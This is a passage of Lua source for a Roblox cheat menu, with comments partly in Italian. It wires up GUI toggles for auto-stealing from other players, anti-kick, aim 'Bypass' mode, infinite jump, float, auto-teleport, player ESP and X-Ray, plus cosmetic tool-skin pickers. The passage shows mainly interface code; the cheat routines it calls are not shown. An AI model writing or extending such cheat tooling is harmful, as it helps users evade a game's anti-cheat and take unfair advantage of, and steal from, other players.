            end)
            return b
        end
        mkAimModeBtn("Normal", -208, "normal")
        mkAimModeBtn("Bypass", -104, "bypass")
    end
    autoLeftSetVisual = mkToggleKB(sfMechns, "Auto Left", __HH.KB.AutoLeft, function(on)
        if __HH._anyKeyListening then return end
        autoLeftEnabled = on
        if __HH.mobBtnRefs.autoLeft then __HH.mobBtnRefs.autoLeft(on) end
        if on then startAutoLeft() else stopAutoLeft() end
        saveConfig()
    end, function() saveConfig() end)
    autoLeftSetVisual(autoLeftEnabled)

    autoRightSetVisual = mkToggleKB(sfMechns, "Auto Right", __HH.KB.AutoRight, function(on)
        if __HH._anyKeyListening then return end
        autoRightEnabled = on
        if __HH.mobBtnRefs.autoRight then __HH.mobBtnRefs.autoRight(on) end
        if on then startAutoRight() else stopAutoRight() end
        saveConfig()
    end, function() saveConfig() end)
    autoRightSetVisual(autoRightEnabled)


    mkSect(sfCombat, "Auto Steal")
    do
        local bridge = _G.HorizonStealModes
        mkToggle(sfCombat, "Auto Steal", function(on) if bridge then bridge.SetEnabled(on) end end, bridge and bridge.GetEnabled() or false)
        local row=mkRow(sfCombat);mkLabel(row,"Steal Mode")
        local v1Btn=Instance.new("TextButton",row);v1Btn.Size=UDim2.new(0,58,0,20);v1Btn.Position=UDim2.new(1,-122,.5,-10);v1Btn.Text="V1";v1Btn.Font=Enum.Font.GothamBold;v1Btn.TextSize=8;v1Btn.BorderSizePixel=0;v1Btn.ZIndex=5;Instance.new("UICorner",v1Btn).CornerRadius=UDim.new(0,4)
        local v2Btn=Instance.new("TextButton",row);v2Btn.Size=UDim2.new(0,58,0,20);v2Btn.Position=UDim2.new(1,-58,.5,-10);v2Btn.Text="V2";v2Btn.Font=Enum.Font.GothamBold;v2Btn.TextSize=8;v2Btn.BorderSizePixel=0;v2Btn.ZIndex=5;Instance.new("UICorner",v2Btn).CornerRadius=UDim.new(0,4)
        local function paint(m) v1Btn.BackgroundColor3=m=="V1" and WHITE or BTN_ACT;v2Btn.BackgroundColor3=m=="V2" and WHITE or BTN_ACT;v1Btn.TextColor3=m=="V1" and BLACK or WHITE;v2Btn.TextColor3=m=="V2" and BLACK or WHITE end
        v1Btn.MouseButton1Click:Connect(function() if bridge then bridge.SetMode("V1");paint("V1") end end)
        v2Btn.MouseButton1Click:Connect(function() if bridge then bridge.SetMode("V2");paint("V2") end end);paint(bridge and bridge.GetMode() or "V1")
        mkBoxRow(sfCombat,"Radius",bridge and bridge.GetRadius() or 60,function(v) if bridge then bridge.SetRadius(v) end end)
    end

    mkSect(sfCombat, "Misc")
    setSafeModeVisual = mkToggle(sfCombat, "Anti Kick", function(on)
        antiKickEnabled = on
        if on and _G.AceSafeModeIsLocked and _G.AceSafeModeIsLocked()
            and _G.AceSafeModeForceStop then
            _G.AceSafeModeForceStop("AIM BOT BEFORE START")
        end
        saveConfig()
    end, antiKickEnabled)
    __HH.setInfJumpVisual = mkToggle(sfCombat, "Infinite Jump", function(on)
        __HH.infJumpEnabled = on
        if __HH.infJumpEnabled then if __HH.infJumpMode == "hold" then __HH.startHoldInfJump() end
        else __HH.stopHoldInfJump() end
        saveConfig()
    end, __HH.infJumpEnabled)

    -- Jump Mode selector: Manual / Hold
    do
        local jRow = mkRow(sfCombat); mkLabel(jRow, "Jump Mode")
        local jBtns = {}
        local function mkJumpModeBtn(lbl, xOff, mode)
            local b = Instance.new("TextButton", jRow)
            b.Size = UDim2.new(0,52,0,20); b.Position = UDim2.new(1,xOff,0.5,-10)
            b.BackgroundColor3 = (__HH.infJumpMode==mode) and WHITE or BTN_ACT
            b.BorderSizePixel = 0; b.Text = lbl
            b.TextColor3 = (__HH.infJumpMode==mode) and BLACK or Color3.fromRGB(180,180,200)
            b.Font = Enum.Font.GothamBold; b.TextSize = 8; b.AutoButtonColor = false; b.ZIndex = 5
            Instance.new("UICorner", b).CornerRadius = UDim.new(0,4)
            table.insert(jBtns, b)
            b.MouseButton1Click:Connect(function()
                if __HH.infJumpMode == mode then return end
                __HH.infJumpMode = mode
                b.BackgroundColor3 = WHITE; b.TextColor3 = BLACK
                for _, ob in ipairs(jBtns) do
                    if ob ~= b then
                        ob.BackgroundColor3 = BTN_ACT; ob.TextColor3 = Color3.fromRGB(180,180,200)
                    end
                end
                __HH.stopHoldInfJump()
                if __HH.infJumpEnabled and mode == "hold" then __HH.startHoldInfJump() end
                saveConfig()
            end)
            return b
        end
        mkJumpModeBtn("Manual", -110, "manual")
        mkJumpModeBtn("Hold",    -54,  "hold")
    end

    mkSect(sfCombat, "Auto Jump - Brainrot")
    __HH.setAutoJumpBrainrotVisual = mkToggle(sfCombat, "Auto Jump while holding", function(on)
        __HH.autoJumpBrainrot = on
        saveConfig()
    end, __HH.autoJumpBrainrot)

    mkSect(sfCombat, "Float")
    __HH.setFloatVisual = mkToggle(sfCombat, "Float", function(on)
        __HH.floatEnabled = on
        if __HH.FRFloat then __HH.FRFloat.setEnabled(on) end
        saveConfig()
    end, __HH.floatEnabled)
    do
        local fRow = mkRow(sfCombat)
        mkLabel(fRow, "Float Height (studs)")
        local fBox = Instance.new("TextBox", fRow)
        fBox.Size = UDim2.new(0,70,0,20); fBox.Position = UDim2.new(1,-76,0.5,-10)
        fBox.BackgroundColor3 = INP_BG
        fBox.Text = tostring((__HH.FRFloat and __HH.FRFloat.getHeight()) or (__HH.floatHeight or 6))
        fBox.TextColor3 = WHITE; fBox.Font = Enum.Font.GothamBold; fBox.TextSize = 10
        fBox.ClearTextOnFocus = false; fBox.TextXAlignment = Enum.TextXAlignment.Center; fBox.ZIndex = 5
        Instance.new("UICorner", fBox).CornerRadius = UDim.new(0,4)
        local fbs = Instance.new("UIStroke", fBox); fbs.Color = DIM_LINE; fbs.Thickness = 1
        fBox.Focused:Connect(function() TS:Create(fbs, TweenInfo.new(0.12), {Color=WHITE}):Play() end)
        fBox.FocusLost:Connect(function()
            TS:Create(fbs, TweenInfo.new(0.12), {Color=DIM_LINE}):Play()
            local n = tonumber(fBox.Text)
            if n then
                __HH.floatHeight = math.clamp(n, 0, 200)
                if __HH.FRFloat then __HH.FRFloat.setHeight(__HH.floatHeight) end
                saveConfig()
                fBox.Text = tostring(__HH.floatHeight)
            else
                fBox.Text = tostring((__HH.FRFloat and __HH.FRFloat.getHeight()) or (__HH.floatHeight or 6))
            end
        end)
    end

    mkSect(sfCombat, "Auto TP")
    __HH.setAutoTPVisual = mkToggle(sfCombat, "Auto TP", function(on)
        __HH.autoTPEnabled=on; if on then startAutoTP() else __HH.stopAutoTP() end; saveConfig()
    end, __HH.autoTPEnabled)
    mkBoxRow(sfCombat, "TP Height", __HH.autoTPHeight, function(v) if v>=0 and v<=500 then __HH.autoTPHeight=v end; saveConfig() end)

    mkSect(sfVisual, "Avatar")
    mkToggle(sfVisual, "Headless", function(on)
        __HH.headlessEnabled = on == true
        local char = LP.Character
        if char then pcall(function() applyHeadless(char, __HH.headlessEnabled) end) end
        saveConfig()
    end, __HH.headlessEnabled)
    mkToggle(sfVisual, "Korblox", function(on)
        __HH.korbloxEnabled = on == true
        local char = LP.Character
        if char then pcall(function() applyKorblox(char, __HH.korbloxEnabled) end) end
        saveConfig()
    end, __HH.korbloxEnabled)

    -- Pack Accessory (Catalog Changer — VisDuels port)
    do
        local row = mkRow(sfVisual)
        mkLabel(row, "Pack Accessory")
        row.Size = UDim2.new(ROW_W, 0, 0, 42)
        row.ClipsDescendants = true

        local left = Instance.new("TextButton", row)
        left.BackgroundColor3 = Color3.fromRGB(5, 14, 23); left.BackgroundTransparency = 0.04
        left.Text = "<"; left.TextColor3 = Color3.fromRGB(201, 238, 255); left.TextSize = 12
        left.Font = Enum.Font.GothamSemibold; left.Size = UDim2.new(0, 42, 0, 28)
        left.Position = UDim2.new(1, -186, 0.5, -14); left.BorderSizePixel = 0; left.ZIndex = 8
        Instance.new("UICorner", left).CornerRadius = UDim.new(0, 8)
        local leftStroke = Instance.new("UIStroke", left); leftStroke.Color = Color3.fromRGB(59, 93, 119); leftStroke.Transparency = 0.42

        local holder = Instance.new("Frame", row)
        holder.BackgroundColor3 = Color3.fromRGB(0, 0, 0); holder.BackgroundTransparency = 0.28
        holder.Size = UDim2.new(0, 92, 0, 28); holder.Position = UDim2.new(1, -139, 0.5, -14); holder.ClipsDescendants = true; holder.ZIndex = 7
        Instance.new("UICorner", holder).CornerRadius = UDim.new(0, 8)
        local holderStroke = Instance.new("UIStroke", holder); holderStroke.Color = Color3.fromRGB(201, 238, 255); holderStroke.Transparency = 0.35

        local accValueLabel = Instance.new("TextLabel", holder)
        accValueLabel.BackgroundTransparency = 1; accValueLabel.Text = currentAccessoryPack
        accValueLabel.TextColor3 = Color3.fromRGB(201, 238, 255); accValueLabel.TextSize = 11
        accValueLabel.Font = Enum.Font.GothamSemibold; accValueLabel.Size = UDim2.new(1, 0, 1, 0); accValueLabel.ZIndex = 9
        accValueLabel.TextXAlignment = Enum.TextXAlignment.Center

        local right = Instance.new("TextButton", row)
        right.BackgroundColor3 = Color3.fromRGB(5, 14, 23); right.BackgroundTransparency = 0.04
        right.Text = ">"; right.TextColor3 = Color3.fromRGB(201, 238, 255); right.TextSize = 12
        right.Font = Enum.Font.GothamSemibold; right.Size = UDim2.new(0, 42, 0, 28)
        right.Position = UDim2.new(1, -42, 0.5, -14); right.BorderSizePixel = 0; right.ZIndex = 8
        Instance.new("UICorner", right).CornerRadius = UDim.new(0, 8)
        local rightStroke = Instance.new("UIStroke", right); rightStroke.Color = Color3.fromRGB(59, 93, 119); rightStroke.Transparency = 0.42

        local function updateAccessorySelector(direction)
            local idx = 1
            for i, entry in ipairs(ACCESSORY_PACK_ORDER) do
                if entry[2] == currentAccessoryPack then idx = i; break end
            end
            local newIdx = idx + direction
            if newIdx < 1 then newIdx = #ACCESSORY_PACK_ORDER end
            if newIdx > #ACCESSORY_PACK_ORDER then newIdx = 1 end
            local packName = ACCESSORY_PACK_ORDER[newIdx][2]
            currentAccessoryPack = packName
            accValueLabel.Text = packName
            applyAccessoryPack(packName)
            saveConfig()
        end

        left.MouseButton1Click:Connect(function() updateAccessorySelector(-1) end)
        right.MouseButton1Click:Connect(function() updateAccessorySelector(1) end)
    end

    mkSect(sfVisual, "ESP")
    __HH.setESPVisual = mkToggle(sfVisual, "ESP Players", function(on)
        __HH.espEnabled = on == true
        if on then
            if startPlayerESP then startPlayerESP() end
        else
            if stopPlayerESP then stopPlayerESP() end
        end
        saveConfig()
    end, __HH.espEnabled)

    mkSect(sfVisual, "Visual Effects")
    setAntiLagVisual    = mkToggle(sfVisual, "Anti Lag",    function(on) if on then enableAntiLag() else disableAntiLag() end; saveConfig() end, __HH.antiLagEnabled)
    __HH.setStretchRezVisual = mkToggle(sfVisual, "Stretch Rez", function(on) if on then enableStretchRez() else disableStretchRez() end; saveConfig() end, __HH.stretchRezEnabled)


    -- ===================== AMBITIOUS PORTS (GUI ROWS) =====================
    do
        local function mkSelector(parent, labelText, getText, onLeft, onRight)
            local row = mkRow(parent)
            mkLabel(row, labelText)
            row.Size = UDim2.new(ROW_W, 0, 0, 42)
            row.ClipsDescendants = true
            local function mkArrow(txt, xOff)
                local b = Instance.new("TextButton", row)
                b.BackgroundColor3 = Color3.fromRGB(5, 14, 23); b.BackgroundTransparency = 0.04
                b.Text = txt; b.TextColor3 = WHITE; b.TextSize = 12
                b.Font = Enum.Font.GothamSemibold; b.Size = UDim2.new(0, 42, 0, 28)
                b.Position = UDim2.new(1, xOff, 0.5, -14); b.BorderSizePixel = 0; b.ZIndex = 8
                Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
                local st = Instance.new("UIStroke", b); st.Color = DIM_LINE; st.Transparency = 0.42
                return b
            end
            local left  = mkArrow("<", -186)
            local holder = Instance.new("Frame", row)
            holder.BackgroundColor3 = Color3.fromRGB(0, 0, 0); holder.BackgroundTransparency = 0.28
            holder.Size = UDim2.new(0, 92, 0, 28); holder.Position = UDim2.new(1, -139, 0.5, -14)
            holder.ClipsDescendants = true; holder.ZIndex = 7
            Instance.new("UICorner", holder).CornerRadius = UDim.new(0, 8)
            local hs = Instance.new("UIStroke", holder); hs.Color = WHITE; hs.Transparency = 0.35
            local val = Instance.new("TextLabel", holder)
            val.BackgroundTransparency = 1; val.TextColor3 = WHITE; val.TextSize = 10
            val.Font = Enum.Font.GothamSemibold; val.Size = UDim2.new(1, 0, 1, 0); val.ZIndex = 9
            val.TextXAlignment = Enum.TextXAlignment.Center
            local right = mkArrow(">", -42)
            local function refresh() val.Text = tostring(getText()) end
            left.MouseButton1Click:Connect(function() onLeft(); refresh() end)
            right.MouseButton1Click:Connect(function() onRight(); refresh() end)
            refresh()
            return refresh
        end

        -- ---------------- X-RAY ----------------
        mkSect(sfVisual, "X-Ray")
        mkToggle(sfVisual, "X-Ray", function(on)
            _G.PureXRayEnabled = on == true
            pcall(function() if setXRay then setXRay(on) end end)
            saveConfig()
        end, _G.PureXRayEnabled == true)
        mkToggle(sfVisual, "Brainrot X-Ray", function(on)
            pcall(function() if _G.AmbitiousSetBrainrotXRay then _G.AmbitiousSetBrainrotXRay(on) end end)
            saveConfig()
        end, _G.AmbitiousBrainrotXRayEnabled == true)

        -- ---------------- TOOLS ----------------
        mkSect(sfVisual, "Tools")
        mkToggle(sfVisual, "Custom Tools", function(on)
            if _G.AmbitiousCustomTools then pcall(function() _G.AmbitiousCustomTools.setEnabled(on) end) end
            saveConfig()
        end, _G.AmbitiousCustomToolsEnabled == true)

        -- ---- Custom Tools Selector: popup completo con anteprime 3D ----
        do
            local row = mkRow(sfVisual)
            mkLabel(row, "Custom Tools Selector")

            local pickHolder = Instance.new("Frame", row)
            pickHolder.Size = UDim2.new(0, 62, 0, 24)
            pickHolder.Position = UDim2.new(1, -68, 0.5, -12)
            pickHolder.BackgroundColor3 = BTN_ACT
            pickHolder.BorderSizePixel = 0
            pickHolder.ClipsDescendants = true
            pickHolder.ZIndex = 6
            Instance.new("UICorner", pickHolder).CornerRadius = UDim.new(0, 12)
            local phStroke = Instance.new("UIStroke", pickHolder)
            phStroke.Color = WHITE; phStroke.Thickness = 1.3; phStroke.Transparency = 0.2
            local phGrad = Instance.new("UIGradient", pickHolder)
            phGrad.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.fromRGB(215, 243, 255)),
                ColorSequenceKeypoint.new(0.5, Color3.fromRGB(187, 232, 255)),
                ColorSequenceKeypoint.new(1, Color3.fromRGB(136, 205, 245)),
            })
            phGrad.Rotation = 18

            local pickBtn = Instance.new("TextButton", pickHolder)
            pickBtn.Size = UDim2.new(1, 0, 1, 0)
            pickBtn.BackgroundTransparency = 1
            pickBtn.Text = "PICK"
            pickBtn.TextColor3 = Color3.fromRGB(8, 36, 57)
            pickBtn.Font = Enum.Font.GothamBlack
            pickBtn.TextSize = 11
            pickBtn.AutoButtonColor = false
            pickBtn.ZIndex = 7

            local ctGui = nil
            local function closeCTPicker()
                if ctGui and ctGui.Parent then
                    local fr = ctGui:FindFirstChild("Frame")
                    if fr then TS:Create(fr, TweenInfo.new(0.18), {BackgroundTransparency = 1}):Play() end
                    local dying = ctGui
                    ctGui = nil
                    task.delay(0.22, function()
                        if dying and dying.Parent then dying:Destroy() end
                    end)
                end
                saveConfig()
            end

            pickBtn.MouseButton1Click:Connect(function()
                if ctGui and ctGui.Parent then closeCTPicker() return end

                ctGui = Instance.new("ScreenGui")
                ctGui.Name = "PureCustomToolsPicker"
                ctGui.ResetOnSpawn = false
                ctGui.IgnoreGuiInset = true
                ctGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                ctGui.DisplayOrder = 9999
                if not pcall(function() ctGui.Parent = game:GetService("CoreGui") end) then
                    ctGui.Parent = LP:WaitForChild("PlayerGui")
                end

                local backdrop = Instance.new("TextButton", ctGui)
                backdrop.Size = UDim2.new(1, 0, 1, 0)
                backdrop.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                backdrop.BackgroundTransparency = 0.5
                backdrop.BorderSizePixel = 0
                backdrop.Text = ""
                backdrop.AutoButtonColor = false
                backdrop.ZIndex = 1

                local frame = Instance.new("Frame", ctGui)
                frame.Name = "Frame"
                frame.Size = UDim2.new(0, 420, 0, 470)
                frame.Position = UDim2.new(0.5, -210, 0.5, -235)
                frame.BackgroundColor3 = DARK
                frame.BorderSizePixel = 0
                frame.ZIndex = 2
                Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)
                local fStroke = Instance.new("UIStroke", frame)
                fStroke.Color = WHITE; fStroke.Thickness = 1.3; fStroke.Transparency = 0.3

                local titleBar = Instance.new("Frame", frame)
                titleBar.Size = UDim2.new(1, 0, 0, 44)
                titleBar.BackgroundColor3 = Color3.fromRGB(8, 19, 31)
                titleBar.BackgroundTransparency = 0.1
                titleBar.BorderSizePixel = 0
                titleBar.ZIndex = 3
                Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 16)

                local titleLabel = Instance.new("TextLabel", titleBar)
                titleLabel.Size = UDim2.new(1, -60, 1, 0)
                titleLabel.Position = UDim2.new(0, 16, 0, 0)
                titleLabel.BackgroundTransparency = 1
                titleLabel.Text = "CUSTOM TOOLS SELECTOR"
                titleLabel.TextColor3 = WHITE
                titleLabel.Font = Enum.Font.GothamBlack
                titleLabel.TextSize = 14
                titleLabel.TextXAlignment = Enum.TextXAlignment.Left
                titleLabel.ZIndex = 4

                local closeBtn = Instance.new("TextButton", titleBar)
                closeBtn.Size = UDim2.new(0, 30, 0, 30)
                closeBtn.Position = UDim2.new(1, -38, 0, 7)
                closeBtn.BackgroundColor3 = Color3.fromRGB(12, 28, 43)
                closeBtn.BorderSizePixel = 0
                closeBtn.Text = "X"
                closeBtn.TextColor3 = WHITE
                closeBtn.Font = Enum.Font.GothamBlack
                closeBtn.TextSize = 12
                closeBtn.AutoButtonColor = false
                closeBtn.ZIndex = 4
                Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 8)
                local cbStroke = Instance.new("UIStroke", closeBtn)
                cbStroke.Color = DIM_LINE; cbStroke.Thickness = 1; cbStroke.Transparency = 0.4
                closeBtn.MouseEnter:Connect(function()
                    TS:Create(closeBtn, TweenInfo.new(0.12), {BackgroundColor3 = Color3.fromRGB(180, 50, 50)}):Play()
                end)
                closeBtn.MouseLeave:Connect(function()
                    TS:Create(closeBtn, TweenInfo.new(0.12), {BackgroundColor3 = Color3.fromRGB(12, 28, 43)}):Play()
                end)
                closeBtn.MouseButton1Click:Connect(closeCTPicker)

                -- ---- selettore sezioni Bat | Medusa ----
                local tabsHolder = Instance.new("Frame", frame)
                tabsHolder.BackgroundColor3 = Color3.fromRGB(9, 22, 35)
                tabsHolder.BackgroundTransparency = 0.25
                tabsHolder.Size = UDim2.new(1, -24, 0, 38)
                tabsHolder.Position = UDim2.new(0, 12, 0, 58)
                tabsHolder.BorderSizePixel = 0
                tabsHolder.ZIndex = 3
                tabsHolder.ClipsDescendants = true
                Instance.new("UICorner", tabsHolder).CornerRadius = UDim.new(0, 10)

                local slide = Instance.new("Frame", tabsHolder)
                slide.BackgroundColor3 = BTN_ACT
                slide.AnchorPoint = Vector2.new(0.5, 0.5)
                slide.Size = UDim2.new(0.5, 0, 1, 0)
                slide.Position = UDim2.new(0.25, 0, 0.5, 0)
                slide.BorderSizePixel = 0
                slide.ZIndex = 4
                Instance.new("UICorner", slide).CornerRadius = UDim.new(0, 10)
                local slideGrad = Instance.new("UIGradient", slide)
                slideGrad.Color = ColorSequence.new({
                    ColorSequenceKeypoint.new(0, Color3.fromRGB(219, 244, 255)),
                    ColorSequenceKeypoint.new(1, Color3.fromRGB(156, 216, 252)),
                })
                slideGrad.Rotation = 90

                local CATS = { {key = "Bat", text = "BAT"}, {key = "Medusa", text = "MEDUSA"} }
                local catLabels = {}
                for i, c in ipairs(CATS) do
                    local lbl = Instance.new("TextLabel", tabsHolder)
                    lbl.BackgroundTransparency = 1
                    lbl.Text = c.text
                    lbl.TextColor3 = WHITE
                    lbl.TextSize = 12
                    lbl.Font = Enum.Font.GothamBlack
                    lbl.AnchorPoint = Vector2.new(0.5, 0.5)
                    lbl.Size = UDim2.new(0.5, 0, 1, 0)
                    lbl.Position = UDim2.new(0.25 + 0.5 * (i - 1), 0, 0.5, 0)
                    lbl.ZIndex = 6
                    catLabels[i] = lbl
                end

                -- ---- area anteprime ----
                local page = Instance.new("Frame", frame)
                page.BackgroundTransparency = 1
                page.Size = UDim2.new(1, -24, 1, -118)
                page.Position = UDim2.new(0, 12, 0, 106)
                page.ClipsDescendants = true
                page.ZIndex = 3

                local cards = {}
                local spinConn = nil

                local function buildCard(def, key)
                    local card = Instance.new("Frame", page)
                    card.Name = "Skin_" .. key
                    card.BackgroundColor3 = Color3.fromRGB(7, 18, 29)
                    card.BackgroundTransparency = 0.15
                    card.Size = UDim2.new(0, 148, 0, 172)
                    card.BorderSizePixel = 0
                    card.ZIndex = 4
                    card.Visible = false
                    Instance.new("UICorner", card).CornerRadius = UDim.new(0, 14)
                    local cStroke = Instance.new("UIStroke", card)
                    cStroke.Color = DIM_LINE; cStroke.Thickness = 1.3; cStroke.Transparency = 0.5

                    local vp = Instance.new("ViewportFrame", card)
                    vp.BackgroundColor3 = Color3.fromRGB(4, 13, 22)
                    vp.BackgroundTransparency = 0.25
                    vp.Size = UDim2.new(1, -16, 0, 116)
                    vp.Position = UDim2.new(0, 8, 0, 8)
                    vp.BorderSizePixel = 0
                    vp.ZIndex = 5
                    vp.Ambient = Color3.fromRGB(190, 190, 200)
                    vp.LightColor = Color3.fromRGB(255, 255, 255)
                    vp.LightDirection = Vector3.new(-0.4, -1, -0.6)
                    Instance.new("UICorner", vp).CornerRadius = UDim.new(0, 12)

                    local part = Instance.new("Part")
                    part.Anchored = true
                    part.CanCollide = false
                    part.Size = Vector3.new(1, 1, 1)
                    part.CFrame = CFrame.new(0, 0, 0)
                    part.Parent = vp

                    local mesh = Instance.new("SpecialMesh", part)
                    mesh.MeshType = Enum.MeshType.FileMesh
                    mesh.MeshId = def.mesh
                    mesh.TextureId = def.tex
                    mesh.Scale = def.scale

                    local cam = Instance.new("Camera", vp)
                    cam.FieldOfView = 45
                    vp.CurrentCamera = cam
                    local dist = def.view or 4
                    cam.CFrame = CFrame.new(Vector3.new(0, dist * 0.35, dist), Vector3.new(0, 0, 0))

                    local nameLbl = Instance.new("TextLabel", card)
                    nameLbl.BackgroundTransparency = 1
                    nameLbl.Text = def.label
                    nameLbl.TextColor3 = WHITE
                    nameLbl.TextSize = 12
                    nameLbl.Font = Enum.Font.GothamBlack
                    nameLbl.TextWrapped = true
                    nameLbl.Size = UDim2.new(1, -12, 0, 36)
                    nameLbl.Position = UDim2.new(0, 6, 0, 130)
                    nameLbl.ZIndex = 6

                    local click = Instance.new("TextButton", card)
                    click.BackgroundTransparency = 1
                    click.Text = ""
                    click.AutoButtonColor = false
                    click.Size = UDim2.new(1, 0, 1, 0)
                    click.ZIndex = 8

                    local entry = { card = card, cat = def.cat, key = key, part = part, stroke = cStroke }

                    local function refreshSel()
                        local sel = ((_G.AmbitiousCustomToolSkins or {})[def.cat] == key)
                        TS:Create(cStroke, TweenInfo.new(0.14), {
                            Color = sel and WHITE or DIM_LINE,
                            Transparency = sel and 0 or 0.5,
                            Thickness = sel and 2.2 or 1.3,
                        }):Play()
                        TS:Create(card, TweenInfo.new(0.14), {BackgroundTransparency = sel and 0 or 0.15}):Play()
                    end
                    entry.refresh = refreshSel

                    click.MouseEnter:Connect(function()
                        local w = entry.baseW or card.Size.X.Offset
                        local x = entry.baseX or card.Position.X.Offset
                        TS:Create(card, TweenInfo.new(0.12), {
                            Size = UDim2.new(0, w + 4, 0, 176),
                            Position = UDim2.new(0, x - 2, 0, 8),
                        }):Play()
                    end)
                    click.MouseLeave:Connect(function()
                        local w = entry.baseW or card.Size.X.Offset
                        local x = entry.baseX or card.Position.X.Offset
                        TS:Create(card, TweenInfo.new(0.12), {
                            Size = UDim2.new(0, w, 0, 172),
                            Position = UDim2.new(0, x, 0, 10),
                        }):Play()
                    end)
                    click.MouseButton1Click:Connect(function()
                        if _G.AmbitiousSetCustomToolSkin then
                            pcall(_G.AmbitiousSetCustomToolSkin, def.cat, key)
                        end
                        for _, e in ipairs(cards) do e.refresh() end
                        saveConfig()   -- la skin scelta resta dopo il rejoin
                    end)

                    refreshSel()
                    return entry
                end

                for key, def in pairs(_G.AmbitiousCustomToolAssets or {}) do
                    cards[#cards + 1] = buildCard(def, key)
                end

                spinConn = RunService.RenderStepped:Connect(function(dt)
                    for _, e in ipairs(cards) do
                        if e.card.Visible and e.part.Parent then
                            e.part.CFrame = e.part.CFrame * CFrame.Angles(0, dt * 1.2, 0)
                        end
                    end
                end)
                ctGui.AncestryChanged:Connect(function(_, parent)
                    if not parent and spinConn then
                        pcall(function() spinConn:Disconnect() end)
                        spinConn = nil
                    end
                end)

                local current = "Bat"
                local PAGE_W, GAP, INSET = 420 - 24, 14, 9

                local function layoutCat(cat, fromRight, animate)
                    local list = {}
                    for _, e in ipairs(cards) do
                        if e.cat == cat then list[#list + 1] = e end
                    end
                    local n = #list
                    if n == 0 then return end
                    local cardW = math.floor((PAGE_W - INSET * 2 - GAP * (n - 1)) / n)
                    for i, e in ipairs(list) do
                        local targetX = INSET + (i - 1) * (cardW + GAP)
                        e.card.Size = UDim2.new(0, cardW, 0, 172)
                        e.baseW = cardW
                        e.baseX = targetX
                        e.card.Visible = true
                        if animate then
                            e.card.Position = UDim2.new(0, targetX + (fromRight and 300 or -300), 0, 10)
                            TS:Create(e.card, TweenInfo.new(0.24), {Position = UDim2.new(0, targetX, 0, 10)}):Play()
                        else
                            e.card.Position = UDim2.new(0, targetX, 0, 10)
                        end
                    end
                end

                local switchToken = 0
                local function setCat(cat, animate)
                    if cat == current and animate then return end
                    local goingRight = (cat == "Medusa")
                    switchToken = switchToken + 1
                    local myToken = switchToken

                    local outList = {}
                    for _, e in ipairs(cards) do
                        if e.cat ~= cat and e.card.Visible then outList[#outList + 1] = e end
                    end
                    current = cat

                    if animate then
                        for _, e in ipairs(outList) do
                            local x = e.card.Position.X.Offset
                            TS:Create(e.card, TweenInfo.new(0.18), {
                                Position = UDim2.new(0, x + (goingRight and -300 or 300), 0, 10)
                            }):Play()
                        end
                        task.delay(0.14, function()
                            if myToken ~= switchToken then return end
                            for _, e in ipairs(outList) do
                                if e.card.Parent then e.card.Visible = false end
                            end
                        end)
                    else
                        for _, e in ipairs(outList) do e.card.Visible = false end
                    end

                    layoutCat(cat, goingRight, animate)
                    local idx = (cat == "Bat") and 1 or 2
                    TS:Create(slide, TweenInfo.new(0.2), {Position = UDim2.new(0.25 + 0.5 * (idx - 1), 0, 0.5, 0)}):Play()
                    for i, lbl in ipairs(catLabels) do
                        TS:Create(lbl, TweenInfo.new(0.16), {
                            TextColor3 = (i == idx) and Color3.fromRGB(8, 36, 57) or WHITE,
                            TextTransparency = (i == idx) and 0 or 0.35,
                        }):Play()
                    end
                end

                for i, c in ipairs(CATS) do
                    local clickTab = Instance.new("TextButton", tabsHolder)
                    clickTab.BackgroundTransparency = 1
                    clickTab.Text = ""
                    clickTab.AutoButtonColor = false
                    clickTab.AnchorPoint = Vector2.new(0.5, 0.5)
                    clickTab.Size = UDim2.new(0.5, 0, 1, 0)
                    clickTab.Position = UDim2.new(0.25 + 0.5 * (i - 1), 0, 0.5, 0)
                    clickTab.ZIndex = 8
                    local key = c.key
                    clickTab.MouseButton1Click:Connect(function() setCat(key, true) end)
                end

                backdrop.MouseButton1Click:Connect(closeCTPicker)

                task.defer(function()
                    for _, e in ipairs(cards) do e.card.Visible = false end
                    setCat("Bat", false)
                end)

                frame.Size = UDim2.new(0, 0, 0, 0)
                frame.Position = UDim2.new(0.5, 0, 0.5, 0)
                TS:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
                    Size = UDim2.new(0, 420, 0, 470),
                    Position = UDim2.new(0.5, -210, 0.5, -235)
                }):Play()
            end)
        end

        mkToggle(sfVisual, "Rainbow Tools", function(on)
            if _G.AmbitiousRainbowTools then pcall(function() _G.AmbitiousRainbowTools.setEnabled(on) end) end
            saveConfig()
        end, _G.AmbitiousRainbowToolsEnabled == true)
        mkToggle(sfVisual, "Transparent Tools", function(on)
            if _G.AmbitiousTransparentTools then pcall(function() _G.AmbitiousTransparentTools.setEnabled(on) end) end
            saveConfig()
        end, _G.AmbitiousTransparentToolsEnabled == true)
        mkToggle(sfVisual, "Custom Sounds", function(on)
            if _G.AmbitiousCustomSounds then pcall(function() _G.AmbitiousCustomSounds.setEnabled(on) end) end
            saveConfig()
        end, _G.AmbitiousCustomSoundsEnabled == true)

        -- ---------------- RAINBOW MOBILE JOYSTICK ----------------
        mkSect(sfVisual, "Rainbow Mobile Joystick")
        mkToggle(sfVisual, "Rainbow Mobile Joystick", function(on)
            if _G.AmbitiousSetRainbowJoystick then pcall(_G.AmbitiousSetRainbowJoystick, on) end
            saveConfig()
        end, _G.AmbitiousRainbowJoystickEnabled == true)

        -- ---------------- RADIUS CIRCLE ----------------
        mkSect(sfVisual, "Radius Circle")
        mkToggle(sfVisual, "Radius Circle", function(on)
            if _G.PureSetRadiusCircle then pcall(_G.PureSetRadiusCircle, on) end
            saveConfig()
        end, _G.PureRadiusCircleEnabled == true)
        mkBoxRow(sfVisual, "Circle Radius", _G.PureRadiusCircleRadius or 8, function(v)
            if _G.PureSetRadiusCircleRadius then pcall(_G.PureSetRadiusCircleRadius, v) end
            saveConfig()
        end)

        -- Colour picker vero: barra Hue + quadrato Saturation/Value, con
        -- anteprima dal vivo. Niente piu' tre caselle di numeri.
        do
            local row = mkRow(sfVisual)
            mkLabel(row, "Circle Colour")
